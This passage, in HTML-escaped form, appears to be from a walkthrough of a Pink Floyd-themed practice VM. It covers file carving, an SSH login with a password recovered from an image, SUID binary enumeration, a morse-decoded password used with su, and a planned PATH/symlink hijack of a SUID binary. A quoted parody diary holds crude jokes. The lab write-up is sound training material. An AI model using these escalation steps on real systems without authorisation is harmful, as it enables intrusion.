eclipsed_by_the_moon.lsd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID &lt;span class=&quot;s2&quot;&gt;&quot;MSDOS5.0&quot;&lt;/span&gt;, sectors/cluster 2, reserved sectors 8, root entries 512, Media descriptor 0xf8, sectors/FAT 188, sectors/track 63, heads 255, hidden sectors 2048, sectors 96256 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;volumes &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 32 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; , serial number 0x9e322180, unlabeled, FAT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;16 bit&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now I'm going to use &lt;b&gt;foremost&lt;/b&gt;, great forensics tool, in order to scan the file. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# foremost eclipsed_by_the_moon.lsd
Processing: eclipsed_by_the_moon.lsd
|&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;|
root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;output
root@kali:~/Downloads/output# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 16
drwxr-xr-- 3 root root 4096 Aug  3 08:15 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root root 4096 Aug  3 08:15 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  694 Aug  3 08:15 audit.txt
drwxr-xr-- 2 root root 4096 Aug  3 08:15 jpg
root@kali:~/Downloads/output# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;audit.txt
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Thu Aug  3 08:15:25 2017
Invocation: foremost eclipsed_by_the_moon.lsd
Output directory: /root/Downloads/output
Configuration file: /etc/foremost.conf
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------&lt;/span&gt;
File: eclipsed_by_the_moon.lsd
Start: Thu Aug  3 08:15:25 2017
Length: 47 MB &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;49283072 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Num	 Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;512&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;	       Size	 File Offset	 Comment

0:	00000418.jpg 	     123 KB 	     214016 	 
Finish: Thu Aug  3 08:15:26 2017

1 FILES EXTRACTED

jpg:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------&lt;/span&gt;

Foremost finished at Thu Aug  3 08:15:26 2017
root@kali:~/Downloads/output/jpg# file 00000418.jpg
00000418.jpg: JPEG image data, JFIF standard 1.01, resolution &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, density 72x72, segment length 16, progressive, precision 8, 604x388, frames 3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have a file, let's take a look at it! &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/key-file.png&quot; alt=&quot;Key file&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And here we have a password &lt;b&gt;hello_is_there_anybody_in_there&lt;/b&gt;. But for what account? After another bit of googling I've identified man on the picture as &lt;b&gt;George Roger Waters&lt;/b&gt;. Now we can use previous name scheme and guess the username for &lt;b&gt;ssh&lt;/b&gt; service, with just found password. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/Downloads/output/jpg# ssh RogerWaters@192.168.56.103 -p 1965
RogerWaters@192.168.56.103's password:
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015

                       .u!&quot;`
                   .x*&quot;`
               ..+&quot;NP
            .z&quot;&quot;   ?
          M#`      9     ,     ,
                   9 M  d! ,8P'
                   R X.:x' R'  ,
                   F F' M  R.d'
                   d P  @  E`  ,
      ss           P  '  P  N.d'
       x         ''        '
       X               x             .
       9     .f       !         .    $b
       4;    $k      /         dH    $f
       'X   ;$$     z  .       MR   :$
        R   M$$,   :  d9b      M'   tM
        M:  #'$L  ;' M `8      X    MR
        `$;t' $F  # X ,oR      t    Q;
         $$@  R$ H :RP' $b     X    @'
         9$E  @Bd' $'   ?X     ;    W
         `M'  `$M d$    `E    ;.o* :R   ..
          `    '  &quot;'     '    @'   '$o*&quot;'   
$ ls -la
total 176
drwx------  3 RogerWaters  RogerWaters    512 Oct 28  2015 .
drwxr-xr-x  7 root         wheel          512 Oct 24  2015 ..
-rw-r--r--  1 RogerWaters  RogerWaters     87 Oct 24  2015 .Xdefaults
-rw-r--r--  1 RogerWaters  RogerWaters    773 Oct 24  2015 .cshrc
-rw-r--r--  1 RogerWaters  RogerWaters    103 Oct 24  2015 .cvsrc
-rw-r--r--  1 RogerWaters  RogerWaters    398 Oct 26  2015 .login
-rw-r--r--  1 RogerWaters  RogerWaters    175 Oct 24  2015 .mailrc
-rw-r--r--  1 RogerWaters  RogerWaters    218 Oct 24  2015 .profile
drwx------  2 RogerWaters  RogerWaters    512 Oct 26  2015 .ssh
-rw-r--r--  1 RogerWaters  RogerWaters   2853 Oct 26  2015 bio.txt
-rw-r--r--  1 RogerWaters  RogerWaters      0 Oct 28  2015 mbox
-rw-r--r--  1 RogerWaters  RogerWaters  48177 Oct 26  2015 roger_waters_profile_pic.jpg
-rw-r--r--  1 RogerWaters  RogerWaters  16588 Oct 26  2015 secret-diary&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another series of goodies. Let's take a look at them, one by one. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;secret-diary&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ cat secret-diary                                                                                                                                   
This was posted to alt.music.roger-waters and alt.music.pink-floyd back in mid-1996 by Stuart Greig. It is entirely ficticious and is provided here only as a form of parody.  Source: http://www.ingsoc.com/waters/humour/rwdiary.html

    Week One
    Monday

        Got up, had a bath. Thought that the water looked a dark colour - then realised I still had my aviator sunglasses on. Listened to the radio and felt a bit alienated. Wrote another concept album on video recorders as I realised I'd already done TV and radio. Had lunch and the postman turned up. A letter from mum reminding me that it's Uncle Bob's birthday next week. The power she still wields...will I never be free?? Beat my fists against the wall in anger and frustration for about 20 minutes. Decided to have a cup of tea. Milk had gone off. I detect the hand of David Gilmour in this.

    Tuesday

        Got up. Thought about the war and the market forces destroying the world for an hour or so. Felt a bit depressed so I decided to put on my black jeans, black T shirt, black casual jacket and aviators. Felt much better and decided to go out for some milk and card for Uncle Bob. Nearly got out the door before I realised I hadn't rolled up the sleeves of my casual jacket!! Narrow escape there.

    Wednesday

        Got up, suddenly realised that my father was dead and that no-one understood my alienation as a musical genius. Burnt down the new conservatory in an angst ridden rage. Man next door tried to engage me in conversation about someone called &quot;Gazza&quot; before I torched his too. He is a pleb and I am an artist. He was leaning on the fence watching me. I feel there might be a large scale concept piece in this about the gulf between the artsists and the philistine masses. Couldn't think of a physical symbol to hang the work around and snagged my casual jacket on a nail sticking out of the fence. Asked the pleb if he had seen a man answering David Gilmours description hammering the nail in but he'd obviously paid the pleb off.

    Thursday

        Got up, message from Dave on the ansaphone asking me to get back together with the band again. Rang Eric Clapton and asked him to send Dave's wife some flowers thanking her for the wonderful nights they spent together. That should fuck him up. Felt so good I came up with a great lateral thinking idea on the new album - The Fence!! I could stage it at the whitehouse, or even the moon!! Thought I should probably play myself, but who for Mum and Uncle Bob?? Sinead? Van? Madonna? Phoned Bob Geldof to see if he wanted to get involved. He told me to &quot;fook off&quot;. Felt bad, nearly wrote another album but decided to forgive Bob and went round to join him and we both beat our fists against the wall for a couple of hours.

    Friday

        Got up, then went back to bed as I couldn't face the day - can't anyone else see our lives are revolving around TV?? For god's sake, it should be my musical genius it revolves around!! Mum rang at night tosee if I was OK. She came round with some chicken soup - I didn't eat it as it might have those mind controlling drugs in it but at least she got my other black casual jackets back from the dry cleaners. When will this woman stop controlling my life!!

    Saturday

        Rang Sinead. Apparently she has to tidy her room for the forseeable future. Van rang, but it was difficult to tell wether he was interested or not as there was so much background noise - all bottles clinking and horseracing. Madonna didn't ring back. I detect the hand of David Gilmour in this.

    Sunday

        Project in tatters. Postman came and the first letter was my royalties from Pink Floyds latest tour. I'm sure it's £1 short. Letter from mum - Uncle Bob was killed by a bus yesterday. I feel a large scale concept album about the perils of public transport in a monopolistic state coming on. Finished it in time to watch MTV before bed. Saw David Gilmour dancing with Madonna!!! I detect the hand of my mother in this!!

    Week Two
    Monday

        Got up. Had a bath. Doctor came round - said they would have to operate to remove my sunglasses. Decided to give it a miss - after all, I've never seen Dave Gilmour in shades. Postman arrived with my 55 volume box video set of the first world war. Couldn't see my dad in it, but there was a guy who looked like him. The bleeding hearts came round in the afternoon - apparently Snowy has started taking lessons from Dave himself. We jammed for a bit until someone pointed out I couldn't sing. Threw them all out in a huff.

    Tuesday

        Meeting with the guys at Sony. Apparently they are objecting to my new 3 CD concept album roughly entitled &quot;Record companies screw the life out of creative geniuses worse than Maggie Thatcher did to the miners&quot;. Philistines. They calmed down a bit when they realised it wouldn't be out for another three years by which time the concept would have changed beyond all recognition anyway. Talked about poor album sales. This one had better be good they said, get some good guitarists. They suggested Dave Gilmour - I suggested they fuck off.

        Journalist phoend to ask when I would tour next. Told him as soon as Hades drops below 0 degrees and it's moisture crystalises in to a solid - or if more than a few hundred people buy tickets. He didn't understand the first part but I think he got the message.

    Wednesday

        Phoned Eric Clapton - but his mum said he can't come out to play with me anymore as I depress him. Talked to her about the war for a bit till she hung up. Mothers - they're all the same. Went in the studio and met some guy called Steve Vai - apparently he plays guitar. Asked him to put some stuff over my demos but he just warmed up for an hour, asked if it was OK and left. Dave and the guys were in the studio next door and sent through a demo they were working on to see if I would put some lyrics on it. I did, it went like this -

            Fuck off Dave Gilmour
            And the rest of you too
            Keep your sodding ferraris
            Your mums smell like poo

            You got the floyd name
            but I know your game
            It's all metaphysics
            And I write better lyrics

        Not my best work but I thougt it appropriate under the circumstances. Phoned my lawyer and asked him to phone Dave's lawyer and say that Dave was a wanker. And anyway, didn't I get a restraining order??

    Thursday

        New album going well - should be finished in about 40 odd remixes and several title changes. Did some more work on the opera. Finally found the kind of music for me - you don't need to sing!! You get a big fat woman to do it for you. At least it makes a change from Paul Carrack. Sinead came round for a while and we both moaned about how hard it was to be misunderstood artistic genuis's. She asked if she could do a bit for the new album - said we'd already got someone to make the sandwiches.

    Friday

        Dave phoned again. Apparently he wants to borow my casual jacket. Couldn't find one without the sleeves rolled up so I bought a brand new one. It was worth it after I'd sewn some prawns into the lining and filled the collar with itching powder. Saw Dave later wearing it on Top Of The Pops - he's not playing as well as he used to!! Mum came tound and asked me if I wanted to go to dinner with her and the wife. You mean I'm married??

    Saturday

        Phoned the Ministry Of Defence again and asked them why my dad had to die in the war. Got standard reply from snotty receptionist - &quot;because he was shot through the head by a german, Mr Waters&quot;. Typical. Wrote a song about the snooty girl called &quot;I send people off to die and I don't care (Potzdamer Mix)&quot;.

        Had lunch with my manager. Apparently the Floyd are to be honoured at some big awards and Dave and the boys are going. Said I would go for a laugh. Phoned the wife to see if she wanted to go but she said Dave had already invited her. Bugger.

    Sunday

        Drove by Daves house at 3.00 in the morning playing the Final Cut really loud - Dave came out and threw a guitar at me. Said it was the best thing he'd done with a guitar since The Wall. Drove off really quick after he threatened not to sing any more songs I had the rights to.

        Decided not to go to the awards - sent a Gerald Scarfe cartoon of myself instead. MTV vj said that they nearly didn't recognise me without the casual jacket &amp;amp; shades but I certainly has more charisma than usual. Got really depressed and decided to sell the pics of Dave shagging Kate Bush to the News Of The World. Now that's what I call a discovery!!

    Week Three
    Monday

        Got up, had a bath. Decided to have a cup of tea. Milk had gone off again. Made a mental note to shoot Dave Gilmour. Went for a walk in the park. It was a nice day, lot's of mothers with their children on the swings etc. No fathers around - maybe they all died in the war. Couldn't stay long - the police turned up and took me to the station. Got questioned for two hours on why a middle aged man dressed all in black with sunglasses on should hang around the playground. Talked to the officers about the war and how my father was killed. Got let off with a caution and a promise to see a shrink. On way home had a brilliant idea - a ouija board!! Went straight to the shop and bought one. On the way back I bought another thousand copies of ATD with my Floyd royalties - got to keep the boys at Sony happy and Snowy in guitar lessons.

    Tuesday

        Felt really bad this morning so stayed in bed making anonymous and abusive phone calls to Maggie Thatcher and Ronald Reagan. That will teach them to ruin peoples lives, start wars and promote a soap opera state. But how do they always know it's me?? Called Dave for a laugh - shame he wasn't in, put on my Kate Bush voice and left message saying I was pregnant and was sure the baby was his.

        Contact!!! After 3 hours I think I am in touch with my father!! Asked loads of questions with yes or no answers which he got right!! Eventually asked the BIG ONE, what should I do with my life... message came back: S..T..O..P....F..U..C..K..I.N..G....M..O..A..N..I..N..G!! Went to bed early with a cup of cocoa after beating my fists bloody against the wall.

    Wednesday

        BBC phoned up to ask if I would take part in a documentary - Daves doing it they said. Decided to do it after BBC man assured me we would be recorded on seperate days. Next door came round to ask me to stop beating on the wall - gave them a copy of the album so they could understand. They came back two hours later and asked me to sign it - I did and they left looking puzzled. Heard the man muttering &quot;Shit...I thought he was Dave Gilmour...who IS Roger Waters anyway?&quot; under his breath. Had a cup of black coffee and went to bed. Decided to give the beating my fists against the wall a miss tonight.

        Couldn't sleep, decided to make a list of things that keep me awake at night -

            Thinking about the war.
            Thinking about my father/mother/the war.
            Going round Daves house at 3:00AM and singing &quot;and when the band you're in starts playing different tunes&quot; at the top of my voice.
            Being repeatedly beaten over the head with a rubber chicken.
            Thinking about market forces and the soap opera state.
            Going round Daves at 4:00AM, running thru his garden and singing &quot;the lunatic is on the grass&quot; at the top of my voice.
            Thinking some more about the war.
            Wondering just what I'm going to do to Dave if he comes round and starts any of that rubber chicken shit tonight.
            Lying awake writing lists.

        Fell asleep before I could do number 10.

    Thursday

        Got up late, must get more sleep in future. Decided to work on a new album but couldn't think of a good concept. Listened to all my albums (INCLUDING The Final Cut) in a row and decided to kill myself due to the sheer futility of it all. Couldn't go through with it without writing a new album about what it feels like to want to commit suicide. Finished it and felt a lot better. Sent it to Sony by local courier company - which is trangely called Fat Daves. I always get a kick out of calling and saying &quot;Hello, Fat Daves?? Yeh Roger here, I need you to run an errand for me you fat talentless bastard&quot;. Went to BBC documentary and it turned out to be a tribute to Dave!! And he was there!! According to them one of his new business ventures is a courier company!! Said lots of uncomplimentary things about him on camera but he just ran around laughing behind me making finger gestures behind my head. Eventually he collapsed in a fat heap on the floor covered in sweat. Made a mental note to send him another 400 cream cakes and some of my Grecian 2000. Looks like he didn't like the wig I sent him either.

    Friday

        Got up late again, head still sore from the rubber chicken. Message from Sony on the ansaphone - apparently all the account execs killed themselves this morning. I detect the hand of... er... best not think about that one, Phoned and asked if they had a chance to listen to the album - receptionist hung up on me. Stormed round the garden for a couple of hours in an angst ridden torment. Pleb next door kept staring at me, told him I'd put my Paul Carrack CD on full blast if he didn't fuck off. He did. Continued storming for a bit till it got dark and I banged my shins on the bar-B-Q. Next time I do it in the dark I'll take the aviators off.

        Message on ansaphone from some anonymous woman telling me to stop being such a miserable nutcase and to pull myself together. Sounded like my mother. Recorded new ansaphone message:

            &quot;Hi, this is Roger 'I'm outta my mind, me' Waters, I can't take your call as I am far too busy writing large scale concept albums with outrageous stage shows that will never be performed due to poor ticket sales. ALRIGHT, LOOK... MY FATHER DIED IN THE WAR YOU KNOW!! AND I WAS PERSECUTED BY MY MOTHER FROM AN EARLY AGE!! I THINK THAT GIVES ME THE RIGHT TO BE A MISUNDERSTOOD CREATIVE GENIUS!! Right, OK, and I'm a miserable bugger. Leave your message after the tone. Oh yeh, I said I would tour if ATD sold 2 million copies and to date it's only sold 1.3 million, so get off my back about that one as well. Thanks.&quot;

    Saturday

        Got up early- it's my birthday!! Mum came round with presents - a pint of milk and a fridge. Uncle Bob didn't even send a card!! Dave sent some singing lesson vouchers - bastard!! Made mental note to send him my new book &quot;Writing successful concept albums based around music and good lyrics rather than some crap with a couple of guitar solos in it&quot; if I ever get the bugger published. For some reason all the publishers think it's a bit hypocritical. Had a tantrum as mum forgot the jelly and ice cream. Sat in my room in the dark for a bit and then called Snowy. Told me he couldn't come round to play as he's joined David as rythm guitarist on his solo album!! Phoned Jehovas Witnesses pretending to be in deep spiritual crisis and gave them Daves adress. Went to bed but had to get up 2 hours later as Dave had sent the Moonies round. Got rid of them by talking about the early years with Syd Barret and playing them Interstellar Overdrive.

    Sunday

        Decided to make it up with Dave - dropped by his house and offered to do some lyrics for his solo project, with no mention of the war/soap opera states/alienation etc. Wrote a great song called &quot;The Bravery of being Ronald Reagan behind a big large thing almost like a Wall that shields your feelings at The Anzio Bridgehead whilst on TV&quot;. Dave didn't like it so promised to go home and write another one,

        Got home and decided I din't feel like being nice to him anymore. Sent him these lyrics instead:

            My dad went off to a great big battle
            The TV satellites watched from Seattle
            He fought the buggers left and right
            Then the cameras panned to a dreadful sight
            As some German Kraut
            Snuffed his life right out
            Bugger

            And a monkey sat on Daves old bones
            Buggered his ferraris and wrecked his homes
            And Billy chipped in with Radio Waves
            Shot right up the arse of fat old Dave
            For good lyrics he'll forever hunt
            'Cause that Dave Gilmour, well
            He's just a cunt
            Yeah&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After much more digging I've found that there's more users on the system, apart from the ones we know. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home
total 28
drwxr-xr-x   7 root           wheel          512 Oct 24  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  13 root           wheel          512 Oct 24  2015 ..
drwx------   4 DavidGilmour   DavidGilmour   512 Oct 28  2015 DavidGilmour
drwx------   3 NickMason      NickMason      512 Aug  8  2015 NickMason
drwx------   3 RichardWright  RichardWright  512 Nov 27  2015 RichardWright
drwx------   3 RogerWaters    RogerWaters    512 Oct 28  2015 RogerWaters
drwxr-xr-x   4 root           SydBarrett     512 Oct 24  2015 SydBarrett&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And luckily, two of these users have binaries, with &lt;b&gt;SUID&lt;/b&gt; bit set.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; DavidGilmour 2&amp;gt;/dev/null
/usr/local/bin/shineon
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; NickMason 2&amp;gt;/dev/null
/usr/local/bin/brick&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately, one of them is not accessable at the moment. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/shineon
ksh: /usr/local/bin/shineon: cannot execute - Permission denied&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But the &lt;b&gt;brick&lt;/b&gt; binary is executable and it's asking us for the only member featured on every Pink Floyd album. Quick google query answered this question - it's &lt;b&gt;Nick Mason&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Mason was the only Pink Floyd member to be featured on every one of their albums, and the only constant member of the band since its formation in 1965.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/brick




What have we here, laddie?
Mysterious scribbings?
A secret code?
Oh, poems, no less!
Poems everybody!




Who is the only band member to be featured on every Pink Floyd album? : Nick Mason
/bin/sh: Cannot determine current working directory
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whoami
NickMason&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Correct answer, and we're logged into another account on the machine. Let's take a look at the directories. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/NickMason
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 1576
drwx------  3 NickMason  NickMason     512 Aug  8  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x  7 root       wheel         512 Oct 24  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason      87 Oct 24  2015 .Xdefaults
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     773 Oct 24  2015 .cshrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     103 Oct 24  2015 .cvsrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     398 Oct 24  2015 .login
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     175 Oct 24  2015 .mailrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason     218 Oct 24  2015 .profile
drwx------  2 NickMason  NickMason     512 Oct 28  2015 .ssh
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason    1284 Oct 26  2015 bio.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason       0 Oct 28  2015 mbox
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 NickMason  NickMason  766656 Aug  8  2015 nick_mason_profile_pic.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another group of files. Once again, we have to look at them in order to find clues. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;bio.txt&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;$ cat bio.txt
&quot;Nicholas Berkeley &quot;Nick&quot; Mason (born 27 January 1944) is an English musician and composer, best known as the drummer of Pink Floyd. He is the only constant member of the band since its formation in 1965. Despite solely writing only a few Pink Floyd songs, Mason has co-written some of Pink Floyd's most popular compositions such as &quot;Echoes&quot; and &quot;Time&quot;.

Mason is the only Pink Floyd member to be featured on every one of their albums. It is estimated that as of 2010, the group have sold over 250 million records worldwide,[1][2] including 75 million units sold in the United States.

He competes in auto racing events, such as the 24 Hours of Le Mans.

On 26 November 2012, Mason received an Honorary Doctor of Letters from the University of Westminster at the presentation ceremony of the School of Architecture and Built Environment (he had studied architecture at the University's predecessor, Regent Street Polytechnic, 1962-1967).&quot;

I wander if anyone is reading these bio's?  Richard Wright.. if you're reading this, I'm not really going to cut you into little pieces.  I was just having a joke.  Anyhow, I have now added you to thewall.  You're username is obvious. You'll find your password in my profile pic.

Source: Wikipedia (https://en.wikipedia.org/wiki/Nick_Mason)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;b&gt;nick_mason_profile_pic.jpg&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file nick_mason_profile_pic.jpg                                                                                                                    
nick_mason_profile_pic.jpg: Ogg data, Vorbis audio, stereo, 44100 Hz, created by: Xiph.Org libVorbis I&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It's a sound file! &lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/img/the-wall/nick_mason.ogg&quot;&gt;&lt;b&gt;nick_mason.ogg&lt;/b&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;After listening to it for multiple times, I've noticed a pattern - it's morse code. Let's write it down and translate. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;.-...-.-......-.-.-...--.-...--.....-.--------.....-...--..-..-.-...-.......-
RICHARDWRIGHT1943FARFISA&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another credentials to collection, let's login. Unfortunately we can't &lt;b&gt;ssh&lt;/b&gt; into the account, we have to change account on the current shell.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su RichardWright
Password:
ksh: Cannot determine current working directory
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: .: Permission denied
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whoami
RichardWright&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Quick check showed that now we're able to run previously restricted binary! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/shineon
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
2
Echoes - Meddle
RogerWaters ttyp0    Aug  3 04:42   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.56.102&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;


Press ENTER to &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
1

    August 2017
Su Mo Tu We Th Fr Sa
       1  2  3  4  5
 6  7  8  9 10 11 12
13 14 15 16 17 18 19
20 21 22 23 24 25 26
27 28 29 30 31      

Time - The Dark Side of the Moon

Press ENTER to &lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
3
Is There Anybody Out There? - The Wall
ping: unknown host: www.google.com
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
4
Keep Talking- The Division Bell
No mail &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;RichardWright
Menu

1. Calendar
2. Who
3. Check Internet
4. Check Mail
5. Exit
5
Quitting program&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But running &lt;b&gt;strings&lt;/b&gt; on this binary showed that &lt;b&gt;mail&lt;/b&gt; path is not correctly limited. That way we can create a &lt;b&gt;symlink&lt;/b&gt; that will execute our program, instead of mail. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings /usr/local/bin/shineon
/usr/libexec/ld.so
OpenBSD
OpenBSD
libc.so.80.1
&lt;span class=&quot;nb&quot;&gt;printf
&lt;/span&gt;__stack_smash_handler
__srget
